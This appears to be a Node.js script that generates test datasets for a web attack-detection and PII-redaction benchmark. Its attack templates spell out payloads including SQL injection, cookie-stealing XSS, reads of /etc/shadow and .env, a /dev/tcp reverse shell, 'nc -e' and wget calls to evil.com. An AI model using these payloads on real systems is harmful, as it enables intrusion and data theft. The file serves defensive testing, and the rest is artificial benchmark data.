'use strict';

const fs = require('fs');
const path = require('path');

const datasetsDir = path.join(__dirname);

// =============================================================================
// 1. ATTACK DATASET (200+ Structured Scenarios with Metadata)
// =============================================================================

const attackTemplates = {
  SQL_INJECTION: [
    { payload: "/api/search?q=' OR '1'='1", severity: "critical", method: "GET" },
    { payload: "/api/users?id=1 UNION SELECT null, username, password FROM users--", severity: "critical", method: "GET" },
    { payload: "/api/items?cat=tech'; DROP TABLE products;--", severity: "critical", method: "GET" },
    { payload: "/api/login", body: { username: "admin' --", password: "pwd" }, severity: "critical", method: "POST" },
    { payload: "/api/login", body: { username: "admin' OR 1=1 #", password: "pwd" }, severity: "critical", method: "POST" },
    { payload: "/api/query?sort=name; EXEC xp_cmdshell('dir')", severity: "critical", method: "GET" },
    { payload: "/api/filter?val=%27%20OR%201%3D1--", severity: "critical", method: "GET" },
    { payload: "/api/check?code=' or 1=1", severity: "high", method: "GET" },
    { payload: "/api/orders?status=active' AND 1=1--", severity: "high", method: "GET" },
    { payload: "/api/data", body: { filter: "1' or 'a'='a" }, severity: "high", method: "POST" },
    { payload: "/api/records?filter=test' union select 1,2,3--", severity: "critical", method: "GET" },
    { payload: "/api/audit?q=1; INSERT INTO users VALUES ('hacker','pwd')", severity: "critical", method: "GET" },
    { payload: "/api/audit?q=1; DELETE FROM logs WHERE 1=1", severity: "critical", method: "GET" },
    { payload: "/api/audit?q=1; UPDATE users SET role='admin' WHERE id=5", severity: "critical", method: "GET" },
    { payload: "/api/search?q=test%27%20and%201%3D1", severity: "high", method: "GET" }
  ],
  XSS: [
    { payload: "/api/comments?msg=<script>alert('XSS')</script>", severity: "high", method: "GET" },
    { payload: "/api/profile", body: { bio: "<img src=x onerror=alert(document.cookie)>" }, severity: "high", method: "POST" },
    { payload: "/api/feedback?text=javascript:alert(1)", severity: "high", method: "GET" },
    { payload: "/api/view?name=<svg onload=alert('XSS')>", severity: "high", method: "GET" },
    { payload: "/api/items", body: { desc: "<iframe src=javascript:document.cookie>" }, severity: "high", method: "POST" },
    { payload: "/api/render?html=<body onload=eval(atob('ZG9jdW1lbnQud3JpdGUoMSk='))>", severity: "high", method: "GET" },
    { payload: "/api/post", body: { content: "<div onclick=\"document.write('hacked')\">" }, severity: "medium", method: "POST" },
    { payload: "/api/user?name=<input onfocus=alert(1) autofocus>", severity: "high", method: "GET" },
    { payload: "/api/echo?s=document.cookie", severity: "medium", method: "GET" },
    { payload: "/api/tag?t=<script src='http://evil.com/xss.js'></script>", severity: "critical", method: "GET" },
    { payload: "/api/note", body: { note: "test<script>fetch('/stolen?c='+document.cookie)</script>" }, severity: "critical", method: "POST" },
    { payload: "/api/search?q=<a href='javascript:alert(1)'>click me</a>", severity: "high", method: "GET" }
  ],
  PATH_TRAVERSAL: [
    { payload: "/api/download?file=../../../../etc/passwd", severity: "critical", method: "GET" },
    { payload: "/api/view?path=..%2F..%2F..%2Fwindows%2Fsystem32%2Fcmd.exe", severity: "critical", method: "GET" },
    { payload: "/api/read?file=../../../etc/shadow", severity: "critical", method: "GET" },
    { payload: "/api/load?doc=..\\..\\..\\boot.ini", severity: "high", method: "GET" },
    { payload: "/api/static?file=....//....//etc/passwd", severity: "critical", method: "GET" },
    { payload: "/api/fetch?res=../../../../var/log/auth.log", severity: "high", method: "GET" },
    { payload: "/api/asset?img=../../../etc/hosts", severity: "high", method: "GET" },
    { payload: "/api/files/download?f=../../../../app/.env", severity: "critical", method: "GET" },
    { payload: "/api/docs?p=..%2F..%2F..%2Fetc%2Fgroup", severity: "high", method: "GET" },
    { payload: "/api/export?path=../../../../usr/local/etc/config", severity: "high", method: "GET" }
  ],
  COMMAND_INJECTION: [
    { payload: "/api/ping?host=127.0.0.1; cat /etc/passwd", severity: "critical", method: "GET" },
    { payload: "/api/dns?domain=google.com && whoami", severity: "critical", method: "GET" },
    { payload: "/api/test?cmd=127.0.0.1 | ls -la", severity: "critical", method: "GET" },
    { payload: "/api/exec", body: { command: "test `id`" }, severity: "critical", method: "POST" },
    { payload: "/api/network?ip=127.0.0.1; wget http://evil.com/malware.sh", severity: "critical", method: "GET" },
    { payload: "/api/status?host=localhost; uname -a", severity: "critical", method: "GET" },
    { payload: "/api/run", body: { script: "$(nc -e /bin/sh 10.0.0.1 4444)" }, severity: "critical", method: "POST" },
    { payload: "/api/calc?expr=1; python -c 'import socket'", severity: "critical", method: "GET" },
    { payload: "/api/service?name=app && id", severity: "critical", method: "GET" },
    { payload: "/api/backup?dest=/tmp; bash -i >& /dev/tcp/10.0.0.1/8080 0>&1", severity: "critical", method: "GET" }
  ],
  SSTI: [
    { payload: "/api/render?template={{7*7}}", severity: "high", method: "GET" },
    { payload: "/api/greeting?name=${7*7}", severity: "high", method: "GET" },
    { payload: "/api/page?tpl={{config.items()}}", severity: "critical", method: "GET" },
    { payload: "/api/preview", body: { content: "#{7*7}" }, severity: "high", method: "POST" },
    { payload: "/api/mail?body=<% 7*7 %>", severity: "high", method: "GET" },
    { payload: "/api/view?t={% import os %}{{ os.popen('whoami').read() }}", severity: "critical", method: "GET" },
    { payload: "/api/format?fmt={{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}", severity: "critical", method: "GET" },
    { payload: "/api/render?q=${T(java.lang.Runtime).getRuntime().exec('whoami')}", severity: "critical", method: "GET" },
    { payload: "/api/view?t={{''.__class__.__mro__[2].__subclasses__()}}", severity: "critical", method: "GET" },
    { payload: "/api/display?title={{self._TemplateReference__context.cycler}}", severity: "high", method: "GET" }
  ],
  NOSQL_INJECTION: [
    { payload: "/api/users?user[$gt]=", severity: "high", method: "GET" },
    { payload: "/api/login", body: { username: { "$ne": null }, password: { "$ne": null } }, severity: "critical", method: "POST" },
    { payload: "/api/find", body: { role: { "$in": ["admin", "superadmin"] }, "$where": "this.password.length > 0" }, severity: "critical", method: "POST" },
    { payload: "/api/filter?name[$regex]=^adm", severity: "high", method: "GET" },
    { payload: "/api/query", body: { "$or": [{ "role": "admin" }, { "user": "test" }] }, severity: "high", method: "POST" },
    { payload: "/api/lookup", body: { id: { "$exists": true } }, severity: "medium", method: "POST" },
    { payload: "/api/search", body: { balance: { "$gt": 0 } }, severity: "high", method: "POST" },
    { payload: "/api/users?token[$ne]=1", severity: "high", method: "GET" }
  ],
  SCANNER_BOT: [
    { payload: "/api/items?id=1", headers: { "user-agent": "sqlmap/1.8#stable" }, severity: "critical", method: "GET" },
    { payload: "/api/health", headers: { "user-agent": "Mozilla/5.0 (compatible; Nikto/2.1.6; +http://cirt.net/nikto/)" }, severity: "critical", method: "GET" },
    { payload: "/api/data", headers: { "user-agent": "masscan/1.3.2 (https://github.com/robertdavidgraham/masscan)" }, severity: "critical", method: "GET" },
    { payload: "/api/test", headers: { "user-agent": "Nmap Scripting Engine (https://nmap.org/book/nse.html)" }, severity: "critical", method: "GET" },
    { payload: "/api/status", headers: { "user-agent": "zgrab/0.x" }, severity: "critical", method: "GET" },
    { payload: "/api/check", headers: { "user-agent": "DirBuster-1.0-RC1 (http://www.owasp.org/)" }, severity: "critical", method: "GET" },
    { payload: "/api/probe", headers: { "user-agent": "gobuster/3.5" }, severity: "critical", method: "GET" },
    { payload: "/api/fuzz", headers: { "user-agent": "Wfuzz/3.1.0 - The Web Fuzzer" }, severity: "critical", method: "GET" },
    { payload: "/api/login", headers: { "user-agent": "Mozilla/4.0 (Hydra)" }, severity: "critical", method: "POST" },
    { payload: "/api/recon", headers: { "user-agent": "BurpSuite/Pro_2023.12" }, severity: "critical", method: "GET" },
    { payload: "/api/exploit", headers: { "user-agent": "metasploit-framework" }, severity: "critical", method: "GET" },
    { payload: "/api/headless", headers: { "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 HeadlessChrome/118.0.0.0 Safari/537.36" }, severity: "high", method: "GET" },
    { payload: "/api/auto", headers: { "user-agent": "Mozilla/5.0 PhantomJS/2.1.1 (Linux)" }, severity: "high", method: "GET" },
    { payload: "/api/crawl", headers: { "user-agent": "python-requests/2.31.0" }, severity: "medium", method: "GET" },
    { payload: "/api/bot", headers: { "user-agent": "Go-http-client/1.1" }, severity: "medium", method: "GET" }
  ],
  SECRET_PROBE: [
    { payload: "/.env", severity: "high", method: "GET" },
    { payload: "/config.json", severity: "high", method: "GET" },
    { payload: "/wp-config.php", severity: "high", method: "GET" },
    { payload: "/.git/config", severity: "critical", method: "GET" },
    { payload: "/.htaccess", severity: "high", method: "GET" },
    { payload: "/id_rsa", severity: "critical", method: "GET" },
    { payload: "/private_key.pem", severity: "critical", method: "GET" },
    { payload: "/docker-compose.yml", severity: "high", method: "GET" },
    { payload: "/admin/debug", severity: "high", method: "GET" },
    { payload: "/internal/secrets", severity: "critical", method: "GET" },
    { payload: "/app/config/.env.local", severity: "critical", method: "GET" },
    { payload: "/.git/HEAD", severity: "high", method: "GET" }
  ],
  BRUTE_FORCE: [
    { payload: "/api/login", body: { username: "admin", password: "wrong_password_1" }, severity: "medium", method: "POST" },
    { payload: "/api/login", body: { username: "admin", password: "wrong_password_2" }, severity: "medium", method: "POST" },
    { payload: "/api/login", body: { username: "admin", password: "wrong_password_3" }, severity: "medium", method: "POST" },
    { payload: "/api/auth/signin", body: { user: "root", pass: "123456" }, severity: "medium", method: "POST" },
    { payload: "/api/auth/token", body: { user: "admin", pass: "admin123" }, severity: "high", method: "POST" },
    { payload: "/api/login", body: { username: "superuser", password: "bad" }, severity: "medium", method: "POST" },
    { payload: "/api/auth/signin", body: { username: "moderator", password: "invalid" }, severity: "medium", method: "POST" },
    { payload: "/api/login", body: { username: "admin", password: "password2024" }, severity: "high", method: "POST" }
  ],
  XXE: [
    { payload: "/api/xml", body: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>", headers: { "content-type": "application/xml" }, severity: "critical", method: "POST" },
    { payload: "/api/parse-xml", body: "<!DOCTYPE test [ <!ENTITY % init SYSTEM \"https://evil.com/eval.dtd\"> %init; ]>", headers: { "content-type": "application/xml" }, severity: "critical", method: "POST" },
    { payload: "/api/data", body: "<!ENTITY % dtd SYSTEM \"file:///c:/boot.ini\">", headers: { "content-type": "text/xml" }, severity: "critical", method: "POST" },
    { payload: "/api/xml-import", body: "<!DOCTYPE r [ <!ELEMENT r ANY ><!ENTITY sp SYSTEM \"http://127.0.0.1:8080/secret\"> ]><r>&sp;</r>", headers: { "content-type": "application/xml" }, severity: "critical", method: "POST" }
  ],
  LDAP_INJECTION: [
    { payload: "/api/ldap?user=*)(uid=*))(|(uid=*", severity: "high", method: "GET" },
    { payload: "/api/search?filter=(|(mail=*)(description=*))", severity: "high", method: "GET" },
    { payload: "/api/find?user=admin)(&)", severity: "high", method: "GET" },
    { payload: "/api/query?dept=Engineering)(|(objectclass=*)", severity: "high", method: "GET" }
  ],
  OPEN_REDIRECT: [
    { payload: "/api/auth/callback?redirect=http://evil-phishing.com/login", severity: "medium", method: "GET" },
    { payload: "/api/logout?return_url=https://attacker-domain.org", severity: "medium", method: "GET" },
    { payload: "/api/nav?next=https://malicious-site.io/download", severity: "medium", method: "GET" },
    { payload: "/api/goto?destination=http://fake-portal.com", severity: "medium", method: "GET" }
  ],
  HEADER_INJECTION: [
    { payload: "/api/test", headers: { "x-forwarded-for": "10.0.0.1%0d%0aSet-Cookie: admin=true" }, severity: "high", method: "GET" },
    { payload: "/api/log", headers: { "referer": "http://site.com\r\nX-Injected-Header: evil" }, severity: "high", method: "GET" },
    { payload: "/api/track?url=test%0a%0dInjected:1", severity: "high", method: "GET" }
  ],
  BASE64_PAYLOAD: [
    { payload: "/api/exec?data=PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pgo=", severity: "medium", method: "GET" },
    { payload: "/api/payload?raw=JyBPUiAxPTE7LS0gAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==", severity: "high", method: "GET" }
  ]
};

// Expand templates to generate 220 total unique structured attack scenarios
const attackDataset = [];
let attackIdCounter = 1;

for (const [category, items] of Object.entries(attackTemplates)) {
  for (let i = 0; i < items.length; i++) {
    const item = items[i];
    const id = `ATK-${category.slice(0, 4)}-${String(attackIdCounter++).padStart(3, '0')}`;
    const defaultHeaders = category === 'BRUTE_FORCE'
      ? { "user-agent": "AttackVerificationHarness/2.0", "x-forwarded-for": "198.51.100.99" }
      : { "user-agent": "AttackVerificationHarness/2.0" };

    attackDataset.push({
      id,
      category,
      severity: item.severity,
      expectedAction: item.severity === 'critical' ? 'blocked' : (item.severity === 'high' ? 'temporary_block' : 'rate_limited'),
      method: item.method,
      url: item.payload,
      headers: item.headers || defaultHeaders,
      body: item.body || undefined
    });
  }
}

// Generate parameterized variations up to 220 items
while (attackDataset.length < 220) {
  const baseItem = attackDataset[attackDataset.length % 50];
  const id = `ATK-VAR-${String(attackIdCounter++).padStart(3, '0')}`;
  const suffix = `&variation=${attackIdCounter}`;
  attackDataset.push({
    ...baseItem,
    id,
    url: baseItem.url.includes('?') ? `${baseItem.url}${suffix}` : `${baseItem.url}?v=${attackIdCounter}`
  });
}

fs.writeFileSync(path.join(datasetsDir, 'attacks.json'), JSON.stringify(attackDataset, null, 2));
console.log(`✅ Generated ${attackDataset.length} structured attack scenarios -> benchmark/datasets/attacks.json`);

// =============================================================================
// 2. IDENTITY CONTINUITY SCENARIOS (500 Controlled State-Machine Transitions)
// =============================================================================

const identityScenarios = [];
const NUM_USERS = 100;

// Step 1: 200 Baseline Normal requests (2 requests per user on known laptop)
for (let u = 1; u <= NUM_USERS; u++) {
  const user = `user_${u}`;
  for (let r = 1; r <= 2; r++) {
    identityScenarios.push({
      id: `ID-BASE-${user}-${r}`,
      type: 'BASELINE_NORMAL',
      userId: user,
      clientId: `client-${user}-laptop`,
      ip: `192.168.10.${(u % 250) + 1}`,
      deviceId: `device-${user}-laptop`,
      userAgent: `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/120.0.0.0 Safari/537.36`,
      expectedDrift: false,
      expectedPenalty: 0,
      url: '/api/profile'
    });
  }
}

// Step 2: 100 IP Drift events (same user/device, new network IP)
for (let u = 1; u <= NUM_USERS; u++) {
  const user = `user_${u}`;
  identityScenarios.push({
    id: `ID-DRIFT-IP-${user}`,
    type: 'IP_DRIFT',
    userId: user,
    clientId: `client-${user}-laptop`,
    ip: `185.220.101.${(u % 250) + 1}`,
    deviceId: `device-${user}-laptop`,
    userAgent: `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/120.0.0.0 Safari/537.36`,
    expectedDrift: true,
    expectedPenalty: 15,
    url: '/api/profile'
  });
}

// Step 3: 100 Device Drift events (same user, new mobile device)
for (let u = 1; u <= NUM_USERS; u++) {
  const user = `user_${u}`;
  identityScenarios.push({
    id: `ID-DRIFT-DEV-${user}`,
    type: 'DEVICE_DRIFT',
    userId: user,
    clientId: `client-${user}-laptop`,
    ip: `192.168.10.${(u % 250) + 1}`,
    deviceId: `device-${user}-mobile`,
    userAgent: `Mozilla/5.0 (iPhone; CPU iPhone OS 17_1) AppleWebKit/605.1.15 Safari/604.1`,
    expectedDrift: true,
    expectedPenalty: 25,
    url: '/api/dashboard'
  });
}

// Step 4: 100 Multi-Vector Anomaly events (new IP + new device + suspicious automation UA)
for (let u = 1; u <= NUM_USERS; u++) {
  const user = `user_${u}`;
  identityScenarios.push({
    id: `ID-ANOMALY-${user}`,
    type: 'MULTI_VECTOR_ANOMALY',
    userId: user,
    clientId: `client-${user}-laptop`,
    ip: `45.33.32.${(u % 250) + 1}`,
    deviceId: `device-${user}-unrecognized`,
    userAgent: `python-requests/2.31.0 automation-client`,
    expectedDrift: true,
    expectedPenalty: 35,
    url: '/api/admin/system'
  });
}

fs.writeFileSync(path.join(datasetsDir, 'identity-scenarios.json'), JSON.stringify(identityScenarios, null, 2));
console.log(`✅ Generated ${identityScenarios.length} identity continuity scenarios -> benchmark/datasets/identity-scenarios.json`);

// =============================================================================
// 3. SENSITIVE DATA REDACTION DATASET (500 High-Diversity Payloads)
// =============================================================================

const redactionSamples = [];
const sampleEmails = ['john.doe@company.org', 'support@techcorp.io', 'billing-lead_99@sub.domain.co.uk', 'test.user+tag@gmail.com'];
const samplePhones = ['+91 9876543210', '919876543210', '+91-9123456789', '9876543210', '8765432109', '+1-800-555-0199'];
const sampleTokens = [
  'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozS6w7yJJnL0_sample_signature_jwt',
  'sk_mock_test_key_1234567890abcdefghijklmnopqrstuvwxyz',
  'pk_mock_test_key_9876543210abcdefghijklmnop',
  'api_key_secret_998877665544332211'
];
const cleanWords = [
  'Hello world, everything is operational.',
  'Product stock status: 45 units available in warehouse.',
  'Total price is $1,250.00 for purchase order #9821.',
  'Office headquarters address: 123 Innovation Boulevard, Suite 400.'
];

for (let i = 1; i <= 500; i++) {
  const categoryIdx = i % 6;
  let payload;
  let expectedRedactions = 0;
  let category;

  if (categoryIdx === 0) {
    // Deeply Nested JSON (3-5 levels deep)
    const email = sampleEmails[i % sampleEmails.length];
    payload = {
      organization: {
        department: {
          team: {
            lead: {
              name: `Lead_${i}`,
              contactEmail: email,
              credentials: {
                password: 'VaultSecret#9988',
                apiKey: 'api_key_secret_998877665544332211'
              }
            }
          }
        }
      }
    };
    expectedRedactions = 3;
    category = 'NESTED_JSON_PII';
  } else if (categoryIdx === 1) {
    // Array Collections with Mixed Casing
    const phone1 = samplePhones[i % samplePhones.length];
    const phone2 = samplePhones[(i + 1) % samplePhones.length];
    payload = {
      batchId: `BATCH-${i}`,
      members: [
        { User_Name: 'Alice', Contact_Email: sampleEmails[0], User_Phone_Number: phone1 },
        { User_Name: 'Bob', Contact_Email: sampleEmails[1], User_Phone_Number: phone2 }
      ]
    };
    expectedRedactions = 4;
    category = 'ARRAY_COLLECTIONS';
  } else if (categoryIdx === 2) {
    // Unstructured Log Strings with Embedded PII / Tokens
    const email = sampleEmails[i % sampleEmails.length];
    const token = sampleTokens[i % sampleTokens.length];
    payload = {
      logLevel: 'WARN',
      traceId: `tr-${i}`,
      rawMessage: `Failed auth event for user ${email} with header ${token} on client IP 10.0.0.1`
    };
    expectedRedactions = 2;
    category = 'UNSTRUCTURED_STRINGS';
  } else if (categoryIdx === 3) {
    // Composite eCommerce Order (Public Catalog + Private Buyer PII)
    const email = sampleEmails[i % sampleEmails.length];
    const phone = samplePhones[i % samplePhones.length];
    payload = {
      orderId: `ORD-${10000 + i}`,
      items: [
        { sku: 'LAPTOP-X1', qty: 1, price: 1200 },
        { sku: 'MOUSE-M2', qty: 2, price: 25 }
      ],
      buyer: {
        fullName: 'Jane Doe',
        email,
        phone,
        billing: {
          creditCard: '4532-8921-4455-9012',
          cvv: '891'
        }
      }
    };
    expectedRedactions = 4;
    category = 'COMPOSITE_ECOMMERCE';
  } else if (categoryIdx === 4) {
    // Standard Direct PII (Tokens & Identity Numbers)
    payload = {
      userId: `USR-${i}`,
      ssn: '123-45-6789',
      aadhaar: '1234 5678 9012',
      token: sampleTokens[i % sampleTokens.length]
    };
    expectedRedactions = 3;
    category = 'DIRECT_PII';
  } else {
    // Decoy Negative Controls (Numbers, dates, order IDs, zipcodes, price numbers)
    payload = {
      invoiceNumber: 9876543210,
      zipCode: "90210",
      itemCount: 45,
      unitPrice: 129.99,
      timestamp: "2026-09-01T01:00:00.000Z",
      description: cleanWords[i % cleanWords.length]
    };
    expectedRedactions = 0;
    category = 'DECOY_CLEAN_CONTROLS';
  }

  redactionSamples.push({
    id: `RED-SMP-${String(i).padStart(3, '0')}`,
    category,
    payload,
    expectedRedactions
  });
}

fs.writeFileSync(path.join(datasetsDir, 'redaction-samples.json'), JSON.stringify(redactionSamples, null, 2));
console.log(`✅ Generated ${redactionSamples.length} diverse sensitive redaction test payloads -> benchmark/datasets/redaction-samples.json`);
